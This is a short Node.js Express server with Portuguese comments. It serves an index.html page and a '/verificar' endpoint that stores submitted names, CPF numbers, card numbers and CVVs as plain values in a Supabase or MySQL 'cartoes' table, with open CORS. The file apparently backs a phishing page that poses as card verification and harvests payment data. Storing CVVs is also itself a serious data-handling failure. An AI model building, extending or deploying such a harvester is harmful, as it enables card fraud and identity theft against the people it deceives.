const express = require('express');
const mysql = require('mysql2');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const isProd = process.env.NODE_ENV === 'production';

// --- CONFIGURAÇÃO DOS BANCOS ---
let dbMySQL;
let supabase;

if (isProd) {
    supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
    console.log("🚀 Modo: PRODUÇÃO (Supabase)");
} else {
    dbMySQL = mysql.createConnection({
        host: process.env.DB_HOST,
        user: process.env.DB_USER,
        password: process.env.DB_PASS,
        database: process.env.DB_NAME
    });
    dbMySQL.connect(err => {
        if (err) console.error("❌ Erro MySQL:", err.message);
        else console.log("🏠 Modo: DESENVOLVIMENTO (MySQL Local)");
    });
}

// --- ROTA DE ENVIO ---
app.post('/verificar', async (req, res) => {
    const { nome, cpf, numero, cvv } = req.body;

    if (isProd) {
        // Lógica Supabase (Produção)
        const { error } = await supabase
            .from('cartoes')
            .insert([{ nome, cpf, numero_cartao: numero, cvv }]);
        
        if (error) return res.status(500).json({ error: error.message });
        res.json({ status: "Sucesso no Supabase" });
    } else {
        // Lógica MySQL (Local)
        const sql = "INSERT INTO cartoes (nome, cpf, numero_cartao, cvv) VALUES (?, ?, ?, ?)";
        dbMySQL.query(sql, [nome, cpf, numero, cvv], (err) => {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ status: "Sucesso no MySQL Local" });
        });
    }
});
// Adicione isso para o servidor mostrar o seu index.html na raiz
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));